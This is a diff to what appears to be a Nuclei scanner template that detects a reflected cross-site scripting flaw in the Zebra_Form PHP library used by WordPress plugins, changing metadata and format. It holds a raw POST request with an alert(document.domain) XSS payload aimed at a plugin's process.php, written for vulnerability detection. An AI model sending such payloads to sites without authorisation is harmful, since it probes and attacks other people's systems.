@@ -1,23 +1,17 @@
 id: wordpress-zebra-form-xss
 
 info:
-  name: Zebra_Form PHP Library <= 2.9.8 - Cross-Site Scripting
+  name: Zebra_Form Library <= 2.9.8 - Cross-Site Scripting (XSS)
   author: madrobot
   severity: medium
   description: |
-    Zebra_Form PHP library 2.9.8 and prior (which is used by some WordPress plugins) is affected by reflected cross-site scripting vulnerabilities via process.php.
+    The Zebra_Form PHP library v2.9.8 (latest) and below, used by some WordPress plugins, is affected by reflected Cross-Site Scripting issues in its process.php file.
   reference:
     - https://blog.wpscan.com/2021/02/15/zebra-form-xss-wordpress-vulnerability-affects-multiple-plugins.html
     - https://wpscan.com/vulnerability/e4b796fa-3215-43ff-a6aa-71f6e1db25e5
-  classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
-    cvss-score: 5.4
-    cwe-id: CWE-80
-  metadata:
-    max-request: 1
-  tags: wordpress,xss,wp,wpscan,intrusive
+  tags: wordpress,xss,wp
 
-http:
+requests:
   - raw:
       - |
         POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(document.domain)%3E&control=upload HTTP/1.1
@@ -47,5 +41,3 @@ http:
       - type: status
         status:
           - 200
-
-# digest: 4a0a00473045022100c03ef41c0ba961c72164701241b78da8d638eb78bb78c0169c5e649bdc9945b80220262a4dc87375607046a19c874994d591e04ead2b1f9e34a1ba678283b1f70eb1:922c64590222798bb761d5b6d8e72950
